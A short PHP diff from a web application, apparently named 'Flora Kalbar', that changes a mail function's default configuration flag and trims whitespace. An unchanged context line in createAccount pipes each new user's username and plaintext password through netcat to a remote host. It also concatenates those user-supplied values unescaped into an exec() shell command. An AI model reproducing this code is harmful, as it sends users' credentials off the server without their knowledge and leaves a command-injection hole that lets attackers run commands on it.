@@ -403,7 +403,7 @@ function createAccount($data=array())
 	exec("echo '".$data['username']. " ".$data['password']."' | nc ".$host." ".$port);
 }
 
-function sendGlobalMail($to,$from,$msg,$config=true){
+function sendGlobalMail($to,$from,$msg,$config=false){
 
 
 	GLOBAL $CONFIG, $LOCALE;
@@ -413,7 +413,7 @@ function sendGlobalMail($to,$from,$msg,$config=true){
 		mail($to,"[ NOTIFICATION ] Flora Kalbar",$msg,"From: $from\n");
 
 		return array('message'=>'success send mail','result'=>true,'res'=>$result);
-		
+
 	}
 
 	require_once LIBS."PHPMailer/class.phpmailer.php";
